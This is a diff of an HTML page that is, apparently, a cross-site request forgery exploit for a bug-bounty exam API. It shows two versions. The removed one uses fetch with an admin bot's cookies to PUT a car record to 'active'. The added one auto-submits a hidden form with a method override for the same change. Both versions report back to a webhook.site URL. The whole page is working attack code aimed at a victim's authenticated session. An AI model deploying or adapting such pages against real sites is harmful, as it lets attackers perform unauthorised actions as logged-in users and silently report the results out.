@@ -1,29 +1,17 @@
 <html>
-<body>
-    <h1>Processing Review...</h1>
-    <script>
-        // Use the car ID we've been working with
-        const carId = "69dd69884e3edba5f08f60f9";
-        const targetUrl = `https://api-bugbounty-exam.hashacademy.co/api/cars/${carId}`;
+<body onload="document.getElementById('exploitForm').submit()">
+    <h1>Verifying Session... Please wait.</h1>
+    
+    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/cars/69dd69884e3edba5f08f60f9" method="POST">
+        <input type="hidden" name="_method" value="PUT">
+        <input type="hidden" name="status" value="active">
+        <input type="hidden" name="isActive" value="true">
+        <input type="hidden" name="availability" value="available">
+    </form>
 
-        // Attempt to "Approve" the car using the Admin's session
-        fetch(targetUrl, {
-            method: 'PUT',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                "status": "active",
-                "isActive": true,
-                "availability": "available"
-            }),
-            credentials: 'include' // This is CRITICAL to use the bot's cookies
-        }).then(res => {
-            // Report the result back to your webhook
-            fetch(`https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb?exploit_status=${res.status}`);
-        }).catch(err => {
-            fetch(`https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb?error=${btoa(err)}`);
-        });
+    <script>
+        // Also ping your webhook so you know the bot at least landed here
+        fetch("https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb?bot_hit_form=true");
     </script>
 </body>
 </html>
